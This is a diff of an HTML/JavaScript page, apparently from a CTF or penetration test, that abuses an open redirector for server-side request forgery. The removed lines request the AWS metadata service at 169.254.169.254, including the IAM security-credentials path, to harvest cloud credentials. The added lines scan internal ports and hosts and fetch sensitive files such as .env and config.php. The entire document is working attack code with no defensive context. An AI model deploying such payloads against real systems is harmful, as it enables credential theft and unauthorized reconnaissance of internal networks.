@@ -1,39 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IMSv1 Metadata Test</title>
+    <title>Internal Service Discovery</title>
 </head>
 <body>
-    <h1>Testing AWS Metadata v1.0 via Redirector</h1>
+    <h1>Scanning for Internal Services</h1>
     <div id="results"></div>
     
     <script>
         var results = "";
         
-        // Test different metadata service versions
-        var endpoints = [
-            'http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/',
-            'http://localhost/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/',
-            'http://localhost/redir.php?url=http://169.254.169.254/2007-01-19/meta-data/',
-            'http://localhost/redir.php?url=http://169.254.169.254/2008-02-01/meta-data/',
-            'http://localhost/redir.php?url=http://169.254.169.254/2009-04-04/meta-data/'
+        // Test common internal services and ports
+        var targets = [
+            'http://localhost:80/',
+            'http://localhost:8080/',
+            'http://localhost:3000/',
+            'http://localhost:5000/',
+            'http://localhost:8000/',
+            'http://127.0.0.1:80/',
+            'http://127.0.0.1:8080/',
+            'http://0.0.0.0:80/',
+            'http://internal/',
+            'http://admin/',
+            'http://backend/',
+            'http://api/',
+            'http://management/',
+            'http://localhost/admin/',
+            'http://localhost/api/',
+            'http://localhost/internal/',
+            'http://localhost/management/',
+            'http://localhost/status/',
+            'http://localhost/health/',
+            'http://localhost/debug/',
+            'http://localhost/.env',
+            'http://localhost/config',
+            'http://localhost/config.php',
+            'http://localhost/phpinfo.php'
         ];
         
-        for(var i = 0; i < endpoints.length; i++) {
+        for(var i = 0; i < targets.length; i++) {
             try {
-                results += "<h3>Test " + (i+1) + ": " + endpoints[i].split('url=')[1] + "</h3>";
+                results += "<h3>Test " + (i+1) + ": " + targets[i] + "</h3>";
                 var xhr = new XMLHttpRequest();
-                xhr.open('GET', endpoints[i], false);
+                xhr.open('GET', 'http://localhost/redir.php?url=' + encodeURIComponent(targets[i]), false);
                 xhr.send();
                 results += "<div style='background:#e8f5e8;padding:10px;border:1px solid green;'>✅ SUCCESS: " + xhr.responseText.length + " bytes</div>";
-                results += "<pre style='background:#f0f0f0;padding:10px;font-size:11px;'>" + xhr.responseText + "</pre>";
-                
-                // If this gives us a directory listing, try to get credentials
-                if(xhr.responseText.includes('iam') || xhr.responseText.includes('security-credentials')) {
-                    results += "<div style='background:#ffff99;padding:5px;'>🔍 Found IAM reference, investigating...</div>";
-                }
+                results += "<div style='background:#f0f0f0;padding:10px;max-height:200px;overflow:scroll;font-size:10px;'>" + xhr.responseText.substring(0, 500) + "...</div>";
             } catch(e) {
-                results += "<div style='background:#ffe8e8;padding:5px;'>❌ " + e.message + "</div>";
+                results += "<div style='background:#ffe8e8;padding:3px;'>❌ " + e.message + "</div>";
             }
         }
         
